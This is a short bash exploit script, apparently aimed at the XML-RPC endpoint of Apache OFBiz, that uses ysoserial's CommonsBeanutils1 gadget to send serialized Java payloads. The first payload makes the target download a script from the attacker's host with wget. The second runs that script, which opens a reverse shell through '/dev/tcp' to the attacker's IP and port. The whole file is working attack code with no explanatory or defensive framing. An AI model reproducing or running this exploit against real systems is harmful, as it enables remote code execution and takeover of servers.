#!/usr/bin/env bash

ip=$1
port=$2
yss_path=$3

echo "bash -i >& /dev/tcp/$ip/$port 0>&1" > shell.sh

first=`java -jar $yss_path CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"` 
second=`java -jar $yss_path CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n"`

function send_payload() {
  curl https://127.0.0.1:8443/webtools/control/xmlrpc -d \
"<?xml version=\"1.0\"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">$1</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>" -skH 'Content-Type: application/xml' >/dev/null
}

send_payload $first
sleep 2
send_payload $second

rm shell.sh
